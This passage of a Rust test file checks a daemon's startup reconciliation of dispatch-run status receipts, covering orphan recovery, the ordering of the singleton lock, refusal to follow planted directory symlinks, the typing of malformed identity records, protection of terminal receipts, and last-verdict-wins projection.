    // failed-ifies it (behavior unchanged by this leaf).
    let ordinary_id = "20260829T120016Z-s1-recovery-ordinary";
    let ordinary_dir = runs_root.join(ordinary_id);
    std::fs::create_dir_all(&ordinary_dir).expect("ordinary run dir");
    std::fs::write(
        ordinary_dir.join("status.json"),
        json!({
            "dispatch_id": ordinary_id,
            "state": "TASK_STATE_WORKING",
        })
        .to_string(),
    )
    .expect("write ordinary receipt");

    let server = crate::MemoryServer::new(home.path().join("server.sqlite"), None).expect("server");
    let recovered = crate::dispatch_ops::recover_orphaned_dispatch_runs(&server);
    assert_eq!(
        recovered,
        vec![ordinary_id.to_string()],
        "only the ordinary receipt is recovered"
    );
    assert_eq!(
        std::fs::read(managed_dir.join("status.json")).expect("read managed after recovery"),
        managed_before,
        "the managed run is never failed-ified by legacy recovery"
    );
    let ordinary_status = read_status(&ordinary_dir);
    assert_eq!(
        ordinary_status["state"], "TASK_STATE_FAILED",
        "ordinary receipts keep the pre-existing recovery outcome"
    );
}

/// Structural: startup reconciliation is wired ONLY after the daemon
/// singleton lock is acquired — a losing second daemon must never mutate
/// receipts — and never from a bare constructor.
#[test]
fn serve_startup_wires_reconciliation_after_singleton_ownership() {
    let daemon = include_str!("../bootstrap/serve/daemon.rs");
    let lock_pos = daemon
        .find("DaemonLock::acquire")
        .unwrap_or_else(|| panic!("daemon path must acquire the singleton lock"));
    let reconciliation_pos = daemon
        .find("record_startup_reconciliation(&server)")
        .unwrap_or_else(|| panic!("daemon path must run startup reconciliation"));
    assert!(
        lock_pos < reconciliation_pos,
        "reconciliation must run only after singleton ownership is proven"
    );
    let serve = include_str!("../bootstrap/serve.rs");
    assert!(
        !serve.contains("record_startup_reconciliation"),
        "server-state build precedes singleton acquisition and must not reconcile"
    );
    let init = include_str!("../server_state/init.rs");
    assert!(
        !init.contains("reconcile_interrupted_managed_runs"),
        "bare MemoryServer construction must never scan or mutate run receipts"
    );
}

/// Codex R3 finding 1 (fixed): a directory symlink under the runs root is
/// never scanned or written through — reconciliation cannot escape the runs
/// root onto a planted outside target.
#[cfg(unix)]
#[test]
fn reconciliation_never_follows_directory_symlinks_out_of_the_runs_root() {
    use std::os::unix::fs::symlink;
    let _serial = crate::utils::global_test_lock()
        .lock()
        .unwrap_or_else(|poisoned| poisoned.into_inner());
    let (home, _runs) = test_env();
    let _home = crate::test_support::EnvRestore::set_path("TACHI_HOME", home.path());
    let runs_root = crate::dispatch_ops::dispatch_runs_root();
    std::fs::create_dir_all(&runs_root).expect("runs root");

    // Planted escape target OUTSIDE the runs root with a foreign-epoch
    // nonterminal managed receipt.
    let outside = tempfile::tempdir().expect("outside dir");
    let outside_run = outside.path().join("run");
    std::fs::create_dir_all(&outside_run).expect("outside run dir");
    let outside_receipt = json!({
        "dispatch_id": "20260829T120017Z-s1-symlink-escape",
        "state": "TASK_STATE_WORKING",
        "status_revision": 3,
        "managed_run_identity": {
            "managed_run_id": "20260829T120017Z-s1-symlink-escape",
            "dispatch_id": "20260829T120017Z-s1-symlink-escape",
            "controller_epoch_id": "ctrl-epoch-a",
            "lifecycle_mode": "TachiManagedBatch",
        },
    });
    std::fs::write(
        outside_run.join("status.json"),
        serde_json::to_vec_pretty(&outside_receipt).expect("serialize"),
    )
    .expect("write outside receipt");
    let outside_before =
        std::fs::read(outside_run.join("status.json")).expect("read outside receipt");

    // Directory symlink inside the runs root pointing at the outside run.
    symlink(&outside_run, runs_root.join("planted-link")).expect("plant symlink");

    let server = crate::MemoryServer::new(home.path().join("server.sqlite"), None).expect("server");
    record_startup_reconciliation(&server);
    let outcome = server
        .startup_reconciliation
        .get()
        .expect("outcome")
        .clone();
    assert!(
        outcome.orphaned.is_empty() && outcome.inconsistent.is_empty(),
        "a symlinked directory must not be reconciled: {outcome:?}"
    );
    assert_eq!(
        std::fs::read(outside_run.join("status.json")).expect("read outside after"),
        outside_before,
        "reconciliation must never write outside the runs root"
    );
}

/// Codex R3 finding 3 (fixed): internally contradictory identity records —
/// missing epoch, mismatched record dispatch_id, wrong lifecycle mode — are
/// typed `inconsistent`, never falsely claimed as foreign-epoch orphans.
#[test]
fn malformed_identity_variants_become_inconsistent_not_orphaned() {
    let _serial = crate::utils::global_test_lock()
        .lock()
        .unwrap_or_else(|poisoned| poisoned.into_inner());
    let (home, _runs) = test_env();
    let _home = crate::test_support::EnvRestore::set_path("TACHI_HOME", home.path());
    let runs_root = crate::dispatch_ops::dispatch_runs_root();

    let mutants = [
        (
            "20260829T120018Z-s1-no-epoch",
            json!({
                "managed_run_id": "20260829T120018Z-s1-no-epoch",
                "dispatch_id": "20260829T120018Z-s1-no-epoch",
                "lifecycle_mode": "TachiManagedBatch",
            }),
        ),
        (
            "20260829T120019Z-s1-bad-dispatch",
            json!({
                "managed_run_id": "20260829T120019Z-s1-bad-dispatch",
                "dispatch_id": "some-other-dispatch",
                "controller_epoch_id": "ctrl-epoch-a",
                "lifecycle_mode": "TachiManagedBatch",
            }),
        ),
        (
            "20260829T120020Z-s1-bad-mode",
            json!({
                "managed_run_id": "20260829T120020Z-s1-bad-mode",
                "dispatch_id": "20260829T120020Z-s1-bad-mode",
                "controller_epoch_id": "ctrl-epoch-a",
                "lifecycle_mode": "AttachedSession",
            }),
        ),
    ];
    for (dispatch_id, identity) in &mutants {
        let run_dir = runs_root.join(dispatch_id);
        std::fs::create_dir_all(&run_dir).expect("run dir");
        std::fs::write(
            run_dir.join("status.json"),
            json!({
                "dispatch_id": dispatch_id,
                "state": "TASK_STATE_WORKING",
                "status_revision": 2,
                "managed_run_identity": identity,
            })
            .to_string(),
        )
        .expect("write mutant receipt");
    }

    let server = crate::MemoryServer::new(home.path().join("server.sqlite"), None).expect("server");
    record_startup_reconciliation(&server);
    let outcome = server
        .startup_reconciliation
        .get()
        .expect("outcome")
        .clone();
    assert!(
        outcome.orphaned.is_empty(),
        "a malformed identity must never be claimed as a foreign-epoch orphan"
    );
    assert_eq!(
        outcome.inconsistent.len(),
        3,
        "every malformed identity variant is typed inconsistent: {:?}",
        outcome.inconsistent
    );
    for (dispatch_id, _) in &mutants {
        let transitions = read_status(&runs_root.join(dispatch_id))["managed_run_reconciliation"]
            ["transitions"]
            .as_array()
            .expect("transitions")
            .clone();
        assert_eq!(
            transitions.len(),
            1,
            "{dispatch_id}: exactly one observation"
        );
        assert_eq!(transitions[0]["verdict"], "inconsistent");
        assert_eq!(transitions[0]["execution_state"], "unknown");
    }
}

/// Codex R4 finding 3 (fixed): a TERMINAL receipt with a malformed identity
/// is never rewritten — terminal wins before any identity validation, so the
/// receipt stays byte/semantically terminal.
#[test]
fn terminal_receipt_with_malformed_identity_is_never_touched() {
    let _serial = crate::utils::global_test_lock()
        .lock()
        .unwrap_or_else(|poisoned| poisoned.into_inner());
    let (home, _runs) = test_env();
    let _home = crate::test_support::EnvRestore::set_path("TACHI_HOME", home.path());
    let runs_root = crate::dispatch_ops::dispatch_runs_root();
    let dispatch_id = "20260829T120021Z-s1-terminal-malformed";
    let run_dir = runs_root.join(dispatch_id);
    std::fs::create_dir_all(&run_dir).expect("run dir");
    let receipt = json!({
        "dispatch_id": dispatch_id,
        "state": "TASK_STATE_COMPLETED",
        "status_revision": 9,
        "managed_run_identity": {
            "managed_run_id": "different-run",
        },
    });
    std::fs::write(
        run_dir.join("status.json"),
        serde_json::to_vec_pretty(&receipt).expect("serialize"),
    )
    .expect("write terminal malformed receipt");
    let before = std::fs::read(run_dir.join("status.json")).expect("read before");

    let server = crate::MemoryServer::new(home.path().join("server.sqlite"), None).expect("server");
    record_startup_reconciliation(&server);
    let outcome = server
        .startup_reconciliation
        .get()
        .expect("outcome")
        .clone();
    assert!(
        outcome.orphaned.is_empty() && outcome.inconsistent.is_empty(),
        "terminal receipts are never appended to: {outcome:?}"
    );
    assert_eq!(
        std::fs::read(run_dir.join("status.json")).expect("read after"),
        before,
        "terminal stays byte-terminal even with a malformed identity"
    );
}

/// Codex R4 finding 2 (fixed): the remaining identity-validation holes —
/// non-object identity records, empty epoch strings, and non-u64
/// `receipt_revision_at_acceptance` — are typed inconsistent, never orphaned
/// and never silently skipped.
#[test]
fn additional_malformed_identity_variants_fail_closed() {
    let _serial = crate::utils::global_test_lock()
        .lock()
        .unwrap_or_else(|poisoned| poisoned.into_inner());
    let (home, _runs) = test_env();
    let _home = crate::test_support::EnvRestore::set_path("TACHI_HOME", home.path());
    let runs_root = crate::dispatch_ops::dispatch_runs_root();

    let mutants: [(&str, Value); 3] = [
        (
            // Non-object identity: present key, unusable record.
            "20260829T120022Z-s1-nonobject-identity",
            json!([]),
        ),
        (
            // Empty epoch string.
            "20260829T120023Z-s1-empty-epoch",
            json!({
                "managed_run_id": "20260829T120023Z-s1-empty-epoch",
                "dispatch_id": "20260829T120023Z-s1-empty-epoch",
                "controller_epoch_id": "",
                "lifecycle_mode": "TachiManagedBatch",
                "receipt_revision_at_acceptance": 2,
            }),
        ),
        (
            // Revision linkage present but wrongly typed.
            "20260829T120024Z-s1-bad-revision",
            json!({
                "managed_run_id": "20260829T120024Z-s1-bad-revision",
                "dispatch_id": "20260829T120024Z-s1-bad-revision",
                "controller_epoch_id": "ctrl-epoch-a",
                "lifecycle_mode": "TachiManagedBatch",
                "receipt_revision_at_acceptance": "invalid",
            }),
        ),
    ];
    for (dispatch_id, identity) in &mutants {
        let run_dir = runs_root.join(dispatch_id);
        std::fs::create_dir_all(&run_dir).expect("run dir");
        std::fs::write(
            run_dir.join("status.json"),
            json!({
                "dispatch_id": dispatch_id,
                "state": "TASK_STATE_WORKING",
                "status_revision": 2,
                "managed_run_identity": identity,
            })
            .to_string(),
        )
        .expect("write mutant receipt");
    }

    let server = crate::MemoryServer::new(home.path().join("server.sqlite"), None).expect("server");
    record_startup_reconciliation(&server);
    let outcome = server
        .startup_reconciliation
        .get()
        .expect("outcome")
        .clone();
    assert!(
        outcome.orphaned.is_empty(),
        "none of the malformed variants may claim a foreign-epoch orphan"
    );
    assert_eq!(
        outcome.inconsistent.len(),
        3,
        "every variant is typed inconsistent: {:?}",
        outcome.inconsistent
    );
}

/// Codex R4 finding 4 (fixed): malformed or unrelated prior reconciliation
/// content must never suppress the orphan fact — a foreign-epoch nonterminal
/// run whose transitions hold junk still receives its orphan observation.
#[test]
fn malformed_prior_reconciliation_never_suppresses_the_orphan_fact() {
    let _serial = crate::utils::global_test_lock()
        .lock()
        .unwrap_or_else(|poisoned| poisoned.into_inner());
    let (home, _runs) = test_env();
    let _home = crate::test_support::EnvRestore::set_path("TACHI_HOME", home.path());
    let dispatch_id = "20260829T120025Z-s1-junk-transitions";
    let run_dir = stage_managed_run(dispatch_id, "ctrl-epoch-a", "TASK_STATE_WORKING");
    let mut status = read_status(&run_dir);
    status["managed_run_reconciliation"] = json!({ "transitions": [null] });
    std::fs::write(
        run_dir.join("status.json"),
        serde_json::to_vec_pretty(&status).expect("serialize"),
    )
    .expect("write junk-transition receipt");

    let server = crate::MemoryServer::new(home.path().join("server.sqlite"), None).expect("server");
    record_startup_reconciliation(&server);
    let outcome = server
        .startup_reconciliation
        .get()
        .expect("outcome")
        .clone();
    assert_eq!(
        outcome.orphaned,
        vec![dispatch_id.to_string()],
        "the owed orphan fact is written despite junk prior content"
    );
    let transitions = read_status(&run_dir)["managed_run_reconciliation"]["transitions"]
        .as_array()
        .expect("transitions")
        .clone();
    assert_eq!(
        transitions.len(),
        2,
        "junk entry retained + orphan appended"
    );
    assert_eq!(
        transitions[1]["verdict"], "orphaned_control_unavailable",
        "the orphan fact is present"
    );
}

/// Codex R4 finding 1 (hardened): if the run directory is swapped for a
/// symlink between the scan and the append, the append refuses instead of
/// writing through the symlink.
#[cfg(unix)]
#[test]
fn append_refuses_when_run_dir_is_swapped_for_a_symlink() {
    use std::os::unix::fs::symlink;
    let runs = tempfile::tempdir().expect("runs");
    let dispatch_id = "20260829T120026Z-s1-append-swap";
    let run_dir = stage_managed_run_at(runs.path(), dispatch_id, "ctrl-epoch-a");
    let outside = tempfile::tempdir().expect("outside");
    std::fs::remove_dir_all(&run_dir).expect("remove real dir");
    symlink(outside.path(), &run_dir).expect("swap for symlink");

    let outcome = append_reconciliation_observation(
        &run_dir,
        VERDICT_ORPHANED,
        "ctrl-epoch-b",
        Some("ctrl-epoch-a"),
        Some("TASK_STATE_WORKING"),
    );
    assert_eq!(
        outcome.unwrap_err(),
        "run_dir_not_a_real_directory",
        "the append must refuse a symlinked run directory"
    );
    assert!(
        !outside.path().join("status.json").exists(),
        "nothing may be written through the symlink"
    );
}

/// Minimal stager used by the append-swap test: same receipt shape as
/// [`stage_managed_run`] but at an explicit parent.
fn stage_managed_run_at(
    runs_root: &std::path::Path,
    dispatch_id: &str,
    accepted_epoch: &str,
) -> std::path::PathBuf {
    let run_dir = runs_root.join(dispatch_id);
    std::fs::create_dir_all(&run_dir).expect("run directory");
    let identity = build_managed_run_identity(
        dispatch_id,
        &ManagedRunIdentityInput {
            controller_epoch_id: accepted_epoch.to_string(),
            assignment_ref: "assign-s1".to_string(),
            assignment_identity_digest: None,
            execution_grant_ref: "grant-s1".to_string(),
            exec_env_ref: None,
            launch_spec_digest: None,
            backend_name: "custom".to_string(),
            backend_metadata_digest: None,
        },
        3,
    );
    std::fs::write(
        run_dir.join("status.json"),
        json!({
            "dispatch_id": dispatch_id,
            "state": "TASK_STATE_WORKING",
            "status_revision": 3,
            "managed_run_identity": identity,
        })
        .to_string(),
    )
    .expect("write staged receipt");
    run_dir
}

/// Codex R5 finding 1 (fixed): the terminal guard in the append covers EVERY
/// verdict — a receipt that turned terminal between the scan and the append
/// is refused even for an inconsistent observation.
#[test]
fn append_refuses_inconsistent_observation_on_terminal_receipt() {
    let _serial = crate::utils::global_test_lock()
        .lock()
        .unwrap_or_else(|poisoned| poisoned.into_inner());
    let runs = tempfile::tempdir().expect("runs");
    let dispatch_id = "20260829T120027Z-s1-append-terminal";
    let run_dir = stage_managed_run_at(runs.path(), dispatch_id, "ctrl-epoch-a");
    // The receipt turned terminal (e.g. a completion landed after the scan).
    let mut status = read_status(&run_dir);
    status["state"] = json!("TASK_STATE_COMPLETED");
    std::fs::write(
        run_dir.join("status.json"),
        serde_json::to_vec_pretty(&status).expect("serialize"),
    )
    .expect("write terminal receipt");
    let before = std::fs::read(run_dir.join("status.json")).expect("read before");

    let outcome = append_reconciliation_observation(
        &run_dir,
        VERDICT_INCONSISTENT,
        "ctrl-epoch-b",
        None,
        Some("TASK_STATE_WORKING"),
    );
    assert_eq!(outcome, Ok(false), "terminal refuses every verdict append");
    assert_eq!(
        std::fs::read(run_dir.join("status.json")).expect("read after"),
        before,
        "a terminal receipt is never rewritten, for any verdict"
    );
}

/// Codex R5 finding 2 (fixed): reconciliation evidence is projected
/// LAST-VERDICT-WINS — an orphan followed by a later inconsistent
/// observation projects unknown; inconsistent followed by orphan projects
/// orphaned.
#[test]
fn projection_reads_reconciliation_evidence_last_verdict_wins() {
    let runs = tempfile::tempdir().expect("runs");
    let dispatch_id = "20260829T120028Z-s1-last-verdict-wins";
    let run_dir = stage_managed_run_at(runs.path(), dispatch_id, "ctrl-epoch-a");
    let mut status = read_status(&run_dir);

    let orphan = json!({
        "verdict": "orphaned_control_unavailable",
        "execution_state": "orphaned",
        "control_state": "unavailable",
    });
    let inconsistent = json!({
        "verdict": "inconsistent",
        "execution_state": "unknown",
        "control_state": "unavailable",
    });

    status["managed_run_reconciliation"] = json!({ "transitions": [orphan.clone()] });
    let projection = read_projection(&status, &run_dir, "ctrl-epoch-b", false).expect("projection");
    assert_eq!(projection["execution_state"], "orphaned");

    status["managed_run_reconciliation"] = json!({ "transitions": [orphan, inconsistent] });
    let projection = read_projection(&status, &run_dir, "ctrl-epoch-b", false).expect("projection");
    assert_eq!(
        projection["execution_state"], "unknown",
        "the newer inconsistent fact wins over the older orphan"
    );

    // Junk entries are not evidence: they never select a posture.
    status["managed_run_reconciliation"] = json!({ "transitions": [null] });
    let projection = read_projection(&status, &run_dir, "ctrl-epoch-b", false).expect("projection");
    assert_eq!(
        projection["execution_state"], "orphaned",
        "junk falls through to the epoch-derived posture (foreign epoch)"
    );
}
